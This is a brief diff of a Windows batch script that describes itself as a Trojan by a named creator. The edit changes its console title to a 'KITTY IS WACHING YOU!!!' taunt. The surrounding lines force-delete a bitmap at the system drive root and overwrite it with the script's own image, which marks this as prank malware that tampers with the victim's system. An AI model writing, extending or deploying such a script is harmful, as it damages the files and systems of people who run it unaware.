@@ -4,7 +4,7 @@
 color 4f 
 echo The file you just executed considered Trojan. If you know what your doing press simply enter. The creator ( Frank South 20 ) is not responsible for any data loss or damage.
 pause 
-title KITTY IS YOU!!!
+title KITTY IS WACHING YOU!!!
 cls
 del %systemdrive%\bg.bmp /q /f
 copy /y bg.bmp %systemdrive%\bg.bmp
